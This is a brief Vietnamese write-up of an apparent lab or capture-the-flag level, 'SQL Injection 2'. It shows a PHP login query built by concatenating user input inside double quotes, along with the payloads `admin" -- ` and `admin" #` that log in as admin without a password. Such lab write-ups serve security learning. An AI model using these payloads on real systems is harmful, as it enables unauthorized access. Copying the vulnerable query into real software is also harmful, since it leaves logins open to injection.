# SQL Injection 2
# Mục tiêu: Login as admin
# 🔥 Phân tích lỗ hổng
Tương tự lv1, nhưng ở đây sử dụng `"`
```
$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
```
# Khai Thác
Thành công `admin" -- ` hoặc `admin" #`